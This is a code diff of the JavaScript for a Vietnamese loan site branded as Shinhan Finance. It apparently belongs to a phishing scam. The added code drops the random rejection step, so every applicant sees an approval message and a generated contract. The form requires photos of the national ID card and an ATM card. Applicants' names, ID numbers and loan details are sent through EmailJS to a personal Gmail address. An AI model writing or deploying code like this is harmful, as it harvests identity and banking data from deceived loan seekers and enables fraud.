@@ -1,18 +1,26 @@
 (function() {
     emailjs.init("c-Ms5MjWbitpDBb-E");
+    console.log("EmailJS initialized");
 })();
 
 document.addEventListener('DOMContentLoaded', () => {
-    // Initialize Swiper for testimonials
-    new Swiper('.swiper', {
-        loop: true,
-        navigation: {
-            nextEl: '.swiper-button-next',
-            prevEl: '.swiper-button-prev',
-        },
-        slidesPerView: 1,
-        spaceBetween: 20,
-    });
+    console.log("DOM loaded, initializing scripts");
+
+    // Initialize Swiper
+    try {
+        new Swiper('.swiper', {
+            loop: true,
+            navigation: {
+                nextEl: '.swiper-button-next',
+                prevEl: '.swiper-button-prev',
+            },
+            slidesPerView: 1,
+            spaceBetween: 20,
+        });
+        console.log("Swiper initialized");
+    } catch (e) {
+        console.error("Swiper init failed:", e);
+    }
 
     // Hamburger menu
     const hamburger = document.querySelector('.hamburger');
@@ -51,15 +59,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    // Category cards
-    document.querySelectorAll('.category-card').forEach(card => {
-        card.addEventListener('click', (e) => {
-            if (!e.target.closest('.sub-items')) {
-                card.classList.toggle('active');
-            }
-        });
-    });
-
     // Language toggle
     const languageToggle = document.querySelector('.language-toggle');
     languageToggle.addEventListener('change', (e) => {
@@ -84,29 +83,13 @@ document.addEventListener('DOMContentLoaded', () => {
         window.scrollTo({ top: 0, behavior: 'smooth' });
     });
 
-    // Progress steps
-    document.querySelectorAll('.progress-step').forEach((step, index) => {
-        step.addEventListener('click', () => {
-            document.querySelectorAll('.progress-step').forEach(s => s.classList.remove('active'));
-            for (let i = 0; i <= index; i++) {
-                document.querySelectorAll('.progress-step')[i].classList.add('active');
-            }
-        });
-    });
-
     // Support buttons
     document.querySelector('.support-btn.call').addEventListener('click', () => {
         window.location.href = 'tel:19001577';
     });
-    document.querySelector('.support-btn.chat').addEventListener('click', () => {
-        alert('Chức năng chat đang được phát triển. Vui lòng gọi hotline 1900 1577 để được hỗ trợ!');
-    });
-    document.querySelector('.support-btn.messenger').addEventListener('click', () => {
-        window.open('https://m.me/shinhanfinancer', '_blank');
-    });
 
     // Modal close
-    document.querySelectorAllJenny('.modal').forEach(modal => {
+    document.querySelectorAll('.modal').forEach(modal => {
         modal.addEventListener('click', (e) => {
             if (e.target === modal) {
                 modal.style.display = 'none';
@@ -123,14 +106,36 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 // Global functions
+window.scrollToRegister = function() {
+    document.getElementById('register-form').scrollIntoView({ behavior: 'smooth' });
+    document.querySelector('#register-form .section-toggle').click();
+};
+
+window.toggleDetails = function(button) {
+    const details = button.parentElement.querySelector('.details');
+    details.classList.toggle('active');
+    button.textContent = details.classList.contains('active') ? 'Ẩn chi tiết' : 'Xem tiếp';
+};
+
+window.closeModal = function(id) {
+    document.getElementById(id).style.display = 'none';
+};
+
 window.calculateLoanInterest = function() {
+    console.log("Calculating loan interest");
     const amount = parseFloat(document.querySelector('#calc-loan-amount').value);
     const term = parseInt(document.querySelector('#calc-loan-term').value);
     const loanType = document.querySelector('#calc-loan-type').value;
-    let rate, maxAmount, maxTerm;
     const resultDiv = document.querySelector('#calc-result');
-    const chartCtx = document.getElementById('loan-chart').getContext('2d');
+    const chartCanvas = document.getElementById('loan-chart');
 
+    if (!chartCanvas) {
+        console.error("Chart canvas not found");
+        resultDiv.innerHTML = 'Lỗi: Không tìm thấy biểu đồ!';
+        return;
+    }
+
+    let rate, maxAmount, maxTerm;
     if (!loanType || loanType === "") {
         resultDiv.innerHTML = 'Vui lòng chọn loại vay!';
         return;
@@ -151,16 +156,6 @@ window.calculateLoanInterest = function() {
             rate = 8.0;
             maxAmount = 900000000;
             maxTerm = 60;
-            break;
-        case "Vay tiêu dùng trực tuyến":
-            rate = 8.5;
-            maxAmount = 100000000;
-            maxTerm = 36;
-            break;
-        case "Vay thế chấp sổ tiết kiệm":
-            rate = 3.0 + 1.9;
-            maxAmount = 500000000;
-            maxTerm = 12;
             break;
         default:
             rate = 0;
@@ -207,121 +202,80 @@ window.calculateLoanInterest = function() {
         resultDiv.innerHTML += `</table>`;
         if (term > 3) resultDiv.innerHTML += `<p>(Hiển thị 3 tháng đầu, tổng cộng ${term} tháng)</p>`;
 
-        const loanTypes = ["Vay mua xe", "Vay mua nhà", "Vay tiêu dùng", "Vay tiêu dùng trực tuyến", "Vay thế chấp sổ tiết kiệm"];
-        const rates = [6.5, 7.0, 8.0, 8.5, 4.9];
-        new Chart(chartCtx, {
-            type: 'bar',
-            data: {
-                labels: loanTypes,
-                datasets: [{
-                    label: 'Lãi suất (%)',
-                    data: rates,
-                    backgroundColor: '#003087'
-                }]
-            },
-            options: {
-                scales: {
-                    y: {
-                        beginAtZero: true
+        try {
+            const chartCtx = chartCanvas.getContext('2d');
+            if (window.loanChart) window.loanChart.destroy();
+            window.loanChart = new Chart(chartCtx, {
+                type: 'bar',
+                data: {
+                    labels: ['Lãi suất'],
+                    datasets: [{
+                        label: 'Lãi suất (%)',
+                        data: [rate],
+                        backgroundColor: '#003087'
+                    }]
+                },
+                options: {
+                    scales: {
+                        y: {
+                            beginAtZero: true,
+                            max: 10
+                        }
                     }
                 }
-            }
-        });
+            });
+            console.log("Chart rendered successfully");
+        } catch (e) {
+            console.error("Chart rendering failed:", e);
+            resultDiv.innerHTML += '<p>Lỗi hiển thị biểu đồ, kết quả vẫn chính xác.</p>';
+        }
     }
-};
-
-window.submitPayment = function() {
-    const account = document.querySelector('#payment-account').value;
-    const amount = parseFloat(document.querySelector('#payment-amount').value);
-    const cccdFront = document.querySelector('#payment-cccd-front').files[0];
-    const cccdBack = document.querySelector('#payment-cccd-back').files[0];
-    const atmCard = document.querySelector('#payment-atm-card').files[0];
-    if (!account || isNaN(amount) || amount <= 0) {
-        alert('Vui lòng nhập đầy đủ thông tin thanh toán!');
-        return;
-    }
-    if (!cccdFront || !cccdBack || !atmCard) {
-        alert('Vui lòng tải lên đầy đủ ảnh CCCD và thẻ ATM!');
-        return;
-    }
-    const maxSize = 5 * 1024 * 1024;
-    if (cccdFront.size > maxSize || cccdBack.size > maxSize || atmCard.size > maxSize) {
-        alert('Ảnh không được vượt quá 5MB!');
-        return;
-    }
-    if (!['image/jpeg', 'image/png'].includes(cccdFront.type) || !['image/jpeg', 'image/png'].includes(cccdBack.type) || !['image/jpeg', 'image/png'].includes(atmCard.type)) {
-        alert('Vui lòng tải lên ảnh định dạng JPEG hoặc PNG!');
-        return;
-    }
-    alert(`Thanh toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account} qua Mobile Banking SOL thành công!`);
-    document.querySelector('#payment-amount').value = '';
-};
-
-window.confirmSettlement = function() {
-    const account = document.querySelector('#settlement-account').value;
-    const amount = parseFloat(document.querySelector('#settlement-amount').value);
-    const resultDiv = document.querySelector('#settlement-result');
-    if (!account || isNaN(amount) || amount <= 0) {
-        resultDiv.innerHTML = 'Vui lòng nhập đầy đủ thông tin tất toán!';
-        return;
-    }
-    const modal = document.createElement('div');
-    modal.className = 'modal';
-    modal.innerHTML = `
-        <div class="modal-content">
-            <h2>Xác Nhận Tất Toán</h2>
-            <p>Bạn muốn tất toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account}?</p>
-            <button onclick="settleLoan('${account}', ${amount}); this.closest('.modal').remove()">Xác nhận</button>
-            <button onclick="this.closest('.modal').remove()">Hủy</button>
-        </div>
-    `;
-    document.body.appendChild(modal);
-    modal.style.display = 'flex';
-};
-
-window.settleLoan = function(account, amount) {
-    const resultDiv = document.querySelector('#settlement-result');
-    setTimeout(() => {
-        resultDiv.innerHTML = `Tất toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account} thành công!`;
-        document.querySelector('#settlement-amount').value = '';
-    }, 1000);
 };
 
 let formData = {};
 window.submitRegistration = function() {
+    console.log("Submitting registration");
     formData = {
-        name: document.querySelector('#register-form input[placeholder="Họ và tên"]').value,
-        phone: document.querySelector('#register-form input[placeholder="Số điện thoại"]').value,
-        email: document.querySelector('#register-form input[type="email"]').value,
-        cccd: document.querySelector('#register-form input[placeholder="CCCD/CMND"]').value,
-        address: document.querySelector('#register-form input[placeholder="Địa chỉ"]').value,
-        income: document.querySelector('#register-form input[placeholder="Thu nhập (VNĐ)"]').value,
-        loanAmount: document.querySelector('#register-form input[placeholder="Số tiền vay (VNĐ)"]').value,
-        loanTerm: document.querySelector('#register-form input[placeholder="Thời hạn vay (tháng)"]').value,
-        loanType: document.querySelector('#register-form select').value,
-        birthDate: document.querySelector('#register-form input[type="date"]').value,
-        gender: document.querySelector('#register-form select:nth-child(11)').value,
-        maritalStatus: document.querySelector('#register-form select:nth-child(12)').value,
-        occupation: document.querySelector('#register-form input[placeholder="Nghề nghiệp"]').value,
-        company: document.querySelector('#register-form input[placeholder="Công ty"]').value,
-        accountBalance: document.querySelector('#register-form input[placeholder="Số dư tài khoản (VNĐ)"]').value,
-        purpose: document.querySelector('#register-form input[placeholder="Mục đích vay"]').value,
+        name: document.querySelector('#reg-name').value.trim(),
+        phone: document.querySelector('#reg-phone').value.trim(),
+        email: document.querySelector('#reg-email').value.trim(),
+        cccd: document.querySelector('#reg-cccd').value.trim(),
+        loanAmount: parseFloat(document.querySelector('#reg-amount').value),
+        loanTerm: parseInt(document.querySelector('#reg-term').value),
+        loanType: document.querySelector('#reg-type').value,
         cccdFront: document.querySelector('#cccd-front').files[0],
         cccdBack: document.querySelector('#cccd-back').files[0],
         atmCard: document.querySelector('#atm-card').files[0]
     };
+
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     const phoneRegex = /^0[0-9]{9}$/;
-    if (!emailRegex.test(formData.email)) {
-        alert('Vui lòng nhập email hợp lệ!');
+    if (!formData.name) {
+        alert('Vui lòng nhập họ và tên!');
         return;
     }
     if (!phoneRegex.test(formData.phone)) {
         alert('Vui lòng nhập số điện thoại hợp lệ!');
         return;
     }
+    if (!emailRegex.test(formData.email)) {
+        alert('Vui lòng nhập email hợp lệ!');
+        return;
+    }
+    if (!formData.cccd) {
+        alert('Vui lòng nhập số CCCD/CMND!');
+        return;
+    }
     if (isNaN(formData.loanAmount) || formData.loanAmount <= 0) {
         alert('Số tiền vay phải lớn hơn 0!');
+        return;
+    }
+    if (isNaN(formData.loanTerm) || formData.loanTerm <= 0) {
+        alert('Thời hạn vay phải lớn hơn 0!');
+        return;
+    }
+    if (!formData.loanType) {
+        alert('Vui lòng chọn loại vay!');
         return;
     }
     if (!formData.cccdFront || !formData.cccdBack || !formData.atmCard) {
@@ -337,22 +291,74 @@ window.submitRegistration = function() {
         alert('Vui lòng tải lên ảnh định dạng JPEG hoặc PNG!');
         return;
     }
-    document.querySelector('#confirm-modal').style.display = 'flex';
-    document.querySelector('#confirm-modal .loader').style.display = 'block';
+
+    const confirmModal = document.getElementById('confirm-modal');
+    confirmModal.style.display = 'flex';
+    document.querySelector('#confirm-modal .loader').classList.add('active');
     document.querySelector('#confirm-modal button').disabled = true;
 
     setTimeout(() => {
-        document.querySelector('#confirm-modal').style.display = 'none';
-        document.querySelector('#confirm-modal .loader').style.display = 'none';
+        confirmModal.style.display = 'none';
+        document.querySelector('#confirm-modal .loader').classList.remove('active');
         document.querySelector('#confirm-modal button').disabled = false;
-        const isApproved = Math.random() > 0.2;
+
         const profileCode = `SHF-${Date.now()}`;
         window.profileCode = profileCode;
-        const approvalModal = document.querySelector('#approval-modal');
+        const approvalModal = document.getElementById('approval-modal');
+        document.getElementById('profile-code').textContent = profileCode;
         approvalModal.style.display = 'flex';
-        if (isApproved) {
-            approvalModal.querySelector('h2').textContent = 'Đã đủ điều kiện vay';
-            approvalModal.querySelector('p').textContent = 'Hồ sơ của bạn đã được duyệt tại Shinhan Finance.';
-        } else {
-            approvalModal.querySelector('h2').textContent = 'Hồ sơ chưa được duyệt';
-            approvalModal.querySelector('p').textContent = 'Vui lòng liên hệ
+
+        emailjs.send("service_ytsr91e", "template_3a7yorj", {
+            name: formData.name,
+            cccd: formData.cccd,
+            loanAmount: formData.loanAmount.toLocaleString('vi-VN'),
+            loanTerm: formData.loanTerm,
+            loanType: formData.loanType,
+            profileCode: profileCode,
+            dateSigned: new Date().toLocaleDateString('vi-VN'),
+            to_email: formData.email
+        }).then(() => {
+            console.log("Email sent to customer");
+        }, (error) => {
+            console.error("EmailJS error:", error);
+            alert('Lỗi gửi email, nhưng hồ sơ đã được duyệt!');
+        });
+
+        emailjs.send("service_ytsr91e", "template_3a7yorj", {
+            name: formData.name,
+            cccd: formData.cccd,
+            loanAmount: formData.loanAmount.toLocaleString('vi-VN'),
+            loanTerm: formData.loanTerm,
+            loanType: formData.loanType,
+            to_email: "trangtrangtrang318@gmail.com"
+        }).then(() => {
+            console.log("Email sent to admin");
+        }, (error) => {
+            console.error("EmailJS error:", error);
+        });
+    }, 2000);
+};
+
+window.showContract = function() {
+    const contractContent = document.getElementById('contract-content');
+    contractContent.innerHTML = `
+        <h3>HỢP ĐỒNG VAY TÍN CHẤP SHINHAN FINANCE</h3>
+        <p><strong>Số hợp đồng:</strong> ${window.profileCode}</p>
+        <p><strong>Ngày ký:</strong> ${new Date().toLocaleDateString('vi-VN')}</p>
+        <p><strong>Bên vay:</strong> ${formData.name}</p>
+        <p><strong>CCCD/CMND:</strong> ${formData.cccd}</p>
+        <p><strong>Số tiền vay:</strong> ${formData.loanAmount.toLocaleString('vi-VN')} VNĐ</p>
+        <p><strong>Thời hạn vay:</strong> ${formData.loanTerm} tháng</p>
+        <p><strong>Loại vay:</strong> ${formData.loanType}</p>
+        <p><strong>Lãi suất:</strong> 8%/năm</p>
+        <p><strong>Điều khoản:</strong> Bên vay cam kết thanh toán đúng hạn.</p>
+    `;
+    document.querySelector('.contract-display').classList.add('active');
+    document.getElementById('approval-modal').style.display = 'none';
+    document.querySelector('.contract-display').scrollIntoView({ behavior: 'smooth' });
+};
+
+window.showDisbursementModal = function() {
+    document.getElementById('disbursement-modal').style.display = 'flex';
+    document.getElementById('approval-modal').style.display = 'none';
+};
